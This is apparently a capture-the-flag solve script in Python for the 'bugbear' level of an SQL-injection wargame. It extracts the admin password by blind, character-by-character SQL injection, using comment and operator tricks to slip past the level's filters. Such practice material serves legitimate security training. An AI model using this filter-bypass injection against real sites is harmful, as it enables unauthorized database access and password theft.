import requests
import string

pw=""
a=string.printable
a=a[:-38]
url = "https://los.rubiya.kr/chall/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php?pw=1&no=1/**/||/**/id/**/in/**/(%22admin%22)%26%26/**/length(pw)/**/in/**/(%228%22)"
cookies = {'PHPSESSID':'7v7frt2j61ef77qr21dfku1kqb'}
for i in range(1,9):
    url = "https://los.rubiya.kr/chall/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php?pw=1&no="
    for j in a:
        url="https://los.rubiya.kr/chall/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php?pw=1&no=1/**/||/**/id/**/in/**/(%22admin%22)%26%26/**/mid(pw,"+str(i)+',1)/**/in/**/("'+str(j)+'")%23'
        res=requests.get(url,cookies=cookies)
        res=res.text
        if "Hello admin" in res:
            pw+=j
            print("%d : %c" % (i,j))
            break
        else: pass
    
